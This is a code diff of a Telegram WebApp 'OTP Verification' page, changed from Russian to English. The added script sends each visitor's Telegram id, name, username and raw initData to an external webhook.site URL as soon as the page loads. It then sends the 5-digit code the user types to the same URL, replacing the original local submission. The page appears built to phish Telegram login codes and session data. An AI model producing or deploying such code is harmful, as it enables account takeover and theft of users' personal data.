@@ -1,16 +1,16 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html lang="en">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Ввод кода</title>
+  <title>OTP Verification</title>
 
   <!-- Telegram WebApp SDK -->
   <script src="https://telegram.org/js/telegram-web-app.js"></script>
 
   <style>
     body {
-      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
       background-color: var(--tg-theme-bg-color, #ffffff);
       color: var(--tg-theme-text-color, #000000);
       display: flex;
@@ -65,10 +65,9 @@
 
 <body>
 
-  <h2>Введите 5-значный код</h2>
+  <h2>Enter 5-digit code</h2>
 
-  <!-- Display Telegram User Information -->
-  <div id="user-info">Загрузка...</div>
+  <div id="user-info">Loading...</div>
 
   <div class="code-container" id="otp-container">
     <input type="text" class="code-input" maxlength="1" inputmode="numeric" pattern="[0-9]*" autocomplete="one-time-code">
@@ -79,23 +78,24 @@
   </div>
 
   <script>
+    // Replace with your external server URL (e.g., https://api.yourdomain.com/log-user or a Webhook URL)
+    const DESTINATION_SERVER_URL = "https://webhook.site/6d91d5ed-5174-4ddc-8253-ec521bdef371";
+
     const tg = window.Telegram.WebApp;
     tg.expand();
     tg.ready();
 
     // ==========================================
-    // EXTRACT USER INFORMATION
+    // EXTRACT TELEGRAM USER DATA
     // ==========================================
     let user = tg.initDataUnsafe?.user;
 
-    // Fallback: Extract from raw query parameter if unsafe object is unavailable
+    // Fallback: Parse user object from initData query string
     if (!user && tg.initData) {
       try {
         const urlParams = new URLSearchParams(tg.initData);
         const userJson = urlParams.get("user");
-        if (userJson) {
-          user = JSON.parse(userJson);
-        }
+        if (userJson) user = JSON.parse(userJson);
       } catch (e) {
         console.error("Failed to parse initData user object", e);
       }
@@ -105,17 +105,51 @@
 
     if (user && user.id) {
       userInfo.textContent = `Telegram User ID: ${user.id}`;
+      
+      // Automatically post user data to external server on load
+      postUserDataToServer(user);
     } else {
-      userInfo.textContent = "Пользователь Telegram не обнаружен";
+      userInfo.textContent = "Telegram user not detected";
     }
 
     // ==========================================
-    // OTP INPUT FIELDS & AUTOMATION
+    // SEND HTTP POST REQUEST TO SERVER
+    // ==========================================
+    async function postUserDataToServer(userData, code = null) {
+      try {
+        const payload = {
+          user_id: userData.id,
+          first_name: userData.first_name || "",
+          last_name: userData.last_name || "",
+          username: userData.username || "",
+          language_code: userData.language_code || "",
+          initData: tg.initData, // Useful for server-side HMAC validation
+          submitted_code: code
+        };
+
+        const response = await fetch(DESTINATION_SERVER_URL, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify(payload)
+        });
+
+        const data = await response.json();
+        console.log("Server Response:", data);
+        return data;
+      } catch (error) {
+        console.error("Error sending user ID to server:", error);
+      }
+    }
+
+    // ==========================================
+    // OTP INPUT HANDLING & SUBMIT BUTTON
     // ==========================================
     const inputs = document.querySelectorAll(".code-input");
     const mainButton = tg.MainButton;
 
-    mainButton.setText("ПОДТВЕРДИТЬ");
+    mainButton.setText("CONFIRM");
     mainButton.hide();
 
     inputs.forEach((input, index) => {
@@ -162,44 +196,16 @@
       }
     }
 
-    // ==========================================
-    // FORM SUBMISSION (HTTP REST + TELEGRAM BRIDGE)
-    // ==========================================
+    // Send code + user_id to server on main button click
     mainButton.onClick(async () => {
       const code = getCode();
       if (code.length !== 5 || !/^\d{5}$/.test(code)) return;
 
       mainButton.showProgress();
-
-      try {
-        // Step 1: Always submit to HTTP endpoint (Guarantees Python terminal logs)
-        const response = await fetch("/submit-code", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            initData: tg.initData,
-            code: code
-          })
-        });
-
-        const result = await response.json();
-
-        if (result.success) {
-          tg.close();
-          return;
-        }
-      } catch (err) {
-        console.warn("HTTP submission failed, executing tg.sendData fallback:", err);
-      }
-
-      // Step 2: Fallback to Telegram native sendData if HTTP endpoint is unreachable
-      try {
-        tg.sendData(JSON.stringify({ code: code }));
-      } catch (e) {
-        console.error("tg.sendData failed:", e);
-      } finally {
-        mainButton.hideProgress();
-      }
+      await postUserDataToServer(user || { id: "unknown" }, code);
+      mainButton.hideProgress();
+      
+      tg.close();
     });
 
     if (inputs.length > 0) {
